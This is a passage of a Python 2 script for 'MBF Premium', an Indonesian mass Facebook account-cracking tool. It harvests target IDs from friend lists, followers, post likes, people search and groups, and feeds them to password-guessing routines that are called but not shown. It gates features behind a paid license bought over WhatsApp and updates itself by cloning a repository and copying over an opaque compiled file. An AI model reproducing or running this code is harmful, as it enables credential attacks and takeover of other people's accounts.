		print h+" ["+k+"*"+h+"]"+p+" Proses Crack Sedang Berjalan.. "
		print h+" ["+k+"!"+h+"]"+p+" Tekan Tombol CTRL+Z untuk Berhenti..!"
		print ""
		if pilih == "1":
			crack_api()
		elif pilih == "2":
			crack()
		elif pilih == "3":
			crack_mobil()
		else:
			__pilih_crack__()

	except KeyboardInterrupt:
		keluar()

def cek_token():
	try:
		token = open("token.txt", "r").read()
	except IOError:
		login()
	else:
		try:
			with requests.Session() as ses_:
				ses_.get("https://graph.facebook.com/me?access_token={}".format(token)).json()["name"]
		except KeyError:
			print m+"\n Token Kedaluarsa..."
			hapus_data_login()
			login()
		except requests.exceptions.ConnectionError:
			exit(k+"\n Gangguan Koneksi Internet!")
def cek_cookie():
	global cookie
	try:
		c_user = open("cookie.txt", "r").readlines()[0].strip("\n")
		fr = open("cookie.txt", "r").readlines()[1].strip("\n")
		xs = open("cookie.txt", "r").readlines()[2].strip("\n")
		sb = open("cookie.txt", "r").readlines()[3].strip("\n")
		cookie = {'c_user': c_user, 
					 'fr': fr, 
					 'xs': xs, 
					 'sb': sb}
	except:
		try:
			cok = open("cookie.txt").read()
			cookie = {"cookie": cok}
		except:
			login()

def banner():
	print """
"""+a+"""________              """+p+""".___________   
"""+a+"""\__  __ \   _______  _"""+p+"""|   \__  __ \  
"""+a+""" |   \|  \_/ __ \  \/ /"""+p+"""   ||   \|  \ 
"""+a+""" |    `   \  ___/\   /"""+p+"""|   ||    `   \\
"""+a+"""/_______  /\___  >\_/ """+p+"""|___/_________/ """+k+"""
 PREMIUM"""+p+""" {"""+h+"""MBF"""+p+"""}"""+a+""" \/ {"""+k+"""Author"""+a+""": """+h+"""IqbalDev"""+a+"""} """
 	print h+" >>>"+p+" IP: "+k+ip
def login():
  try:
	banner()
	print garis
	print p+"       L O G I N   F A C E B O O K"
	print garis
	print h+" ["+p+"1"+h+"]"+p+" Login Dengan FB"+h+" Cookie"
	print h+" ["+p+"2"+h+"]"+p+" Login Dengan FB"+h+" Username & Password"
	print h+" ["+p+"3"+h+"]"+p+" Ikuti Instagram"+h+" IqbalDev"
	print h+" ["+p+"4"+h+"]"+m+" Exit"+p+"..."
	print garis
	pilih = raw_input(h+" ["+k+"?"+h+"]"+p+" Pilih Opsi? ")
	if pilih == "1":
		login_dengan_cookie_()
	elif pilih == "2":
		login_dengan_passwod()
	elif pilih == "3":
		try:
			subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
			jalankan_tool()
		except:
			jalankan_tool()
	elif pilih == "4":
		keluar()
	else:
		login()
  except KeyboardInterrupt:
  	keluar()

def __yuk_yuk__(id_dev):
	deviv = id_dev.replace("1", "5").replace("0", "7")
	with open("cokie.txt", "w") as cok_dev:
		cok_dev.write("80"+deviv+"04")

def __yuk__(id_dev):
	
	with open("cokiez.txt", "w") as dev_:
		dev_.write(id_dev)

import base64
def __menu__(token, cookie):
	try:
		banner()
		try:
			user_agent_ = open("cokie.txt", "r").read()
		except IOError:
			pass
		try:
			cokiez_ = open("cokiez.txt", "r").read()
			cokiez1 = cokiez_.replace("1", "5").replace("0", "7")
			cokiez = "80"+cokiez1+"04"+"l"

		except IOError:
			pass
		with requests.Session() as ses_:
			nama = ses_.get("https://graph.facebook.com/me?access_token={}".format(token)).json()
			print garis
			print h+" ["+k+"*"+h+"]"+p+" Hai:",a+"{"+p+nama["name"]+a+"}"
			print h+" ["+k+"*"+h+"]"+p+" ID :"+d,nama["id"]
			try:
				if user_agent_ == cokiez: 
					print h+" ["+k+"*"+h+"]"+p+" Status:"+h+" Premium*"
				else:
					print h+" ["+k+"*"+h+"]"+p+" Status:"+m+" Belum Premium*"
			except NameError:
				print h+" ["+k+"*"+h+"]"+p+" Status:"+m+" Belum Premium*"
			print garis
			print h+" ["+k+"1"+h+"]"+p+" Crack from friends list"+k+" + TTL"
			try:
				if user_agent_ == cokiez:
					print h+" ["+k+"2"+h+"]"+p+" Crack from Public"+k+"/Teman dari Teman"
					print h+" ["+k+"3"+h+"]"+p+" Crack from Followrs list"
					print h+" ["+k+"4"+h+"]"+p+" Crack from Likes"
					print h+" ["+k+"5"+h+"]"+p+" Crack form People Search"
					print h+" ["+k+"6"+h+"]"+p+" Crack "+a+"friends list from people search"
					print h+" ["+k+"7"+h+"]"+p+" Crack from My Groups"+k+"/Massal"
					print h+" ["+k+"8"+h+"]"+p+" Cek hasil Crack"
					print h+" ["+k+"9"+h+"]"+p+" Log Out Facebook"
					print h+" ["+k+"10"+h+"]"+p+" Update Tool"
					print h+" ["+k+"11"+h+"]"+p+" Exit.."
				else:
					print h+" ["+k+"2"+h+"]"+d+" Crack from Public/Teman dari Teman"
					print h+" ["+k+"3"+h+"]"+d+" Crack from Followrs list"
					print h+" ["+k+"4"+h+"]"+d+" Crack from Likes"
					print h+" ["+k+"5"+h+"]"+d+" Crack form People Search"
					print h+" ["+k+"6"+h+"]"+d+" Crack friends list from people search"
					print h+" ["+k+"7"+h+"]"+d+" Crack from My Groups / Massal"
					print h+" ["+k+"8"+h+"]"+p+" Cek hasil Crack"
					print h+" ["+k+"9"+h+"]"+p+" Log Out Facebook"
					print h+" ["+k+"10"+h+"]"+p+" Update Tool"
					print h+" ["+k+"11"+h+"]"+p+" Exit.."
			except:
				print h+" ["+k+"2"+h+"]"+d+" Crack from Public/Teman dari Teman"
				print h+" ["+k+"3"+h+"]"+d+" Crack from Followrs list"
				print h+" ["+k+"4"+h+"]"+d+" Crack from Likes"
				print h+" ["+k+"5"+h+"]"+d+" Crack form People Search"
				print h+" ["+k+"6"+h+"]"+d+" Crack friends list from people search"
				print h+" ["+k+"7"+h+"]"+d+" Crack from My Groups/Massal"
				print h+" ["+k+"8"+h+"]"+p+" Cek hasil Crack"
				print h+" ["+k+"9"+h+"]"+p+" Log Out Facebook"
				print h+" ["+k+"10"+h+"]"+p+" Update Tool"
				print h+" ["+k+"11"+h+"]"+p+" Exit.."


			try:
				if user_agent_ == cokiez: 
					pass
				else:
					print h+" ["+k+"12"+h+"]"+p+" Dapatkan Versi"+h+" PREMIUM"
			except NameError:
				print h+" ["+k+"12"+h+"]"+p+" Dapatkan Versi"+h+" PREMIUM"
			print garis
			pilih = raw_input(p+" >>> "+h+"")
			if pilih == "1":
				ttl_.append("dev")
				teman(token)
				sandi_dev()
				__pilih_crack__()
				print "\n",garis,p+"Done..."

			beli_lisen = a+"\n [!]"+p+" Upgrade ke versi Premium, dan beli Lisensinya\n     ke Admin! untuk mendapatkan Fitur yg Lengkap"
			try:
				if user_agent_ == cokiez:
					if pilih == "2":
						user = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Masukkan ID/URL Profil Public"+k+": ")
						__get_id__(user)
						teman_teman_(token, _id_user_)
						sandi_dev()
						__pilih_crack__()
						print "\n",garis,p+"Done..."
					elif pilih == "3":
						user = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Masukkan ID/URL Target"+k+": ")
						__get_id__(user)
						pengikut(token, _id_user_)
						sandi_dev()
						__pilih_crack__()
						print "\n",garis,p+"Done..."
					elif pilih == "4":
						id_postingan = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Masukkan ID Postingan"+k+": ")
						likez(cookie, id_postingan)
						sandi_dev()
						__pilih_crack__()
						print "\n",garis,p+"Done..."
					elif pilih == "5":
						keyword = raw_input(h+"\n ["+p+"?"+h+"]"+p+" Cari Orang"+h+": ")
						jumlah = input(h+" ["+p+"?"+h+"]"+p+" Masukkan Jumlah"+k+": ")
						u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
						cari_orang(jumlah, u_orang, cookie)
						sandi_dev()
						print ""
						jm = len(user_id) / 2
						for dev in user_id:
							if len(_user_1) == jm:
								_user_2.append(dev)
								continue
							_user_1.append(dev)
						__pilih_crack__()
						print "\n",garis,p+"Done..."
						exit()
					elif pilih == "6":
						cari_teman.append(1)
						keyword = raw_input(h+"\n ["+p+"?"+h+"]"+p+" Cari orang untk ambil list temannya"+k+": ")
						jumlah = 2
						u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
						cari_orang(jumlah, u_orang, cookie)
					elif pilih == "7":
						my_grup(token)
						print ""
						for dev in set(data_user):
							user_id.append(dev)
							print h+"\r ["+p+"*"+h+"]"+p+" Filter Data Duplikat"+h+": "+str(len(user_id)),
							sys.stdout.flush()
				
						jm = len(user_id) / 2
						for dev in user_id:
							if len(_user_1) == jm:
								_user_2.append(dev)
								continue
							_user_1.append(dev)
						sandi_dev()
						print ""
						__pilih_crack__()
						print "\n",garis,p+"Done..."
						exit()
				else:
					try:
						if pilih == "2" or pilih == "3" or pilih == "4" or pilih == "5":
							if user_agent_ == cokiez:
								pass
							else:
								print beli_lisen
					except:
						print beli_lisen
			except:
				try:
					if pilih == "2" or pilih == "3" or pilih == "4" or pilih == "5":
						if user_agent_ == cokiez:
							pass
						else:
							print beli_lisen
				except:
					print beli_lisen
			if pilih == "8":
				cek_hasil()
			if pilih == "9":
				sub_pil = raw_input(h+"\n ["+p+"*"+h+"]"+p+" Log Out dari Facebook?"+k+"[y/n]"+p+": ")
				if sub_pil == "yes" or sub_pil == "y":
					print k+"\n Keluar Dari Facebook..\n"
					hapus_data_login()
					exit()

				elif sub_pil == "no" or sub_pil == "n":
					__menu__(token, cookie)
				else:
					keluar()

			if pilih == "10":
				try:
					os.system("git clone https://github.com/IqbalDev/dev_id_premium")
					os.system("rm -rf premium.pyc")
					os.system("cd dev_id_premium")
					os.system("cp -f premium.pyc \..")
					os.system("cd ..")
					os.system("rm -rf dev_id_premium")
					print h+"\n Sukses Update Tool.."+p+">_<\n"
					time.sleep(2)
					jalankan_tool()
				except:
					print m+"\n Perangkat Anda Tidak Suport!\n"
					jalankan_tool()
			if pilih == "11":
				keluar()

			try:
				if user_agent_ == cokiez: 
					pass
				else:
					data = uhu
			except NameError:
				if pilih == "12":
					print garis
					print beli_lisen
					no_ = "628812457948"
					print """
  Cara mendapatkan Lisensi Tool ini, 
  Kamu tinggal ikuti arahannya, 
  pertama Chat admin dulu, serta 
  mengirimkan ID yg tertera pada 
  pesan yg nanti kamu Kirimkan,
  untuk di daftarkan oleh admin,
  Tekan Enter lanjut 
  ke"""+h+""" Whatsapp"""+p+""" Untuk Chat Admin
 """+k+""" Lisensi Rp.30.000,"""+h+""" Via DANA/OVO
  """+p+"""Ini No Wa Admin: """+h+no_+"""\n"""
					raw_input(a+" [!]"+h+" Tekan Enter Untuk Lanjut Chat Admin!")
					id__ = nama["id"]
					
					lisen_salah = m+"\n Lisensi Salah, Silahkan Beli Lisensi ke Admin!"
					try:
						id_me = open("cokiez.txt", "r").read()
						if id_me != str(id__):
							print " tidak sama"
							id__ = id_me
					except IOError:
						pass
					try:
						data = open("cokiez.txt", "r").read()
					except IOError:
						__yuk__(id__)
						__yuk_yuk__(id__)
					try:
						print k+"\n ! "+p+"Chat Admin Untuk Beli Lisensinya!"
						print k+" ! "+p+"Berikan ID ini ke Admin: "+h+id__
						print p+"   Untuk Didaftarkan...."
						print ""
						subprocess.check_output(["am", "start", "https://wa.me/"+no_+"?text=*MY%20ID:%20"+id__+"*\nAssalamu'alaikum%20Bang,%20Mau%20Beli%20Lisensi%20Toolnya!"])
					except:
						print a+"\n [!]"+p+" Silahkan Chat Admin Untuk Beli Lisensi!\n     !Jan lupa Kirim ID ini=> "+h+id__
						print a+" [*]"+p+" Ini No Whatsapp Admin: "+h+no_
					try:
						__yuk_yuk__(id__)
						try:
							f = raw_input(h+"\n ["+k+"!"+h+"]"+p+" Masukkan Lisensinya Disini "+k+"--> ")
							dec32 = base64.b32decode(f)
							dec64 = base64.b64decode(dec32)
						except TypeError:
							print m+"\n Salah Man....!"
							hapus_cokie()
							exit()
						try:
							if dec64 == open("cokie.txt", "r").read():
								print h+"\n Sukses... "+p+">_<"
								cokie = open("cokie.txt", "r").read()
								with open("cokie.txt", "w") as gans_:
									gans_.write(cokie+"l")
							else:
								print lisen_salah
								hapus_cokie()

						except KeyboardInterrupt:
							print lisen_salah
							hapus_cokie()
					except KeyboardInterrupt:
						hapus_cokie()
						keluar()
			else:
				keluar()
	except KeyboardInterrupt:
		keluar()

	except KeyError:
		print m+"\n [!] Token Kedaluarsa...\n     Silahkan Login Kembali! "
		login()

if __name__=="__main__":
	cek_token()
	cek_cookie()
	token = open("token.txt", "r").read()
	__menu__(token, cookie)
